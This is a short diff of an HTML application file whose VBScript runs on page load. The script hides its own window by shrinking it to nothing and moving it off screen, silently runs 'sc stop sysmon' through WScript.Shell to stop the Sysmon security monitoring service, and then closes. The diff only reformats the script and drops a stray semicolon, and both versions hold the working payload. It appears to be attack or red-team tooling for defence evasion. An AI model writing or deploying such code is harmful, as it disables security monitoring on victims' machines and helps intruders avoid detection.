@@ -1,9 +1,16 @@
 <HTML> 
  <HEAD>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
- <script language="VBScript">  Sub window_onload   window.resizeTo 0,0   window.MoveTo -100,-100   const impersonation = 3
-  Const HIDDEN_WINDOW = 12
-  Set Locator = CreateObject("WScript.Shell")
-  Locator.Run"sc stop sysmon;",0,FALSE   window.close()  end sub  </script>
+ <script language="VBScript">  
+	Sub window_onload   
+	window.resizeTo 0,0   
+	window.MoveTo -100,-100   
+	const impersonation = 3
+    const HIDDEN_WINDOW = 12
+    Set Locator = CreateObject("WScript.Shell")
+	Locator.Run"sc stop sysmon",0,FALSE   
+	window.close() 
+	end sub 
+ </script>
  </HEAD>
 </HTML>
